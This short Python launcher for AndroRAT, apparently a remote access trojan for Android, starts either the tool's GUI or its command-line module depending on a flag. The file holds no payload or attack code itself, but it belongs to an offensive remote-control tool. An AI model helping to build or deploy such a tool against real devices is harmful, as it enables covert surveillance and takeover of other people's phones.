#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AndroRAT Launcher
Launches either the CLI or GUI version of AndroRAT
"""

import sys
import os

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--gui":
        # Launch GUI
        try:
            import androRAT_gui
            androRAT_gui.main()
        except ImportError as e:
            print(f"Error launching GUI: {e}")
            print("Make sure tkinter is installed: sudo apt-get install python3-tk")
            sys.exit(1)
    else:
        # Launch CLI (original behavior)
        import androRAT

if __name__ == "__main__":
    main()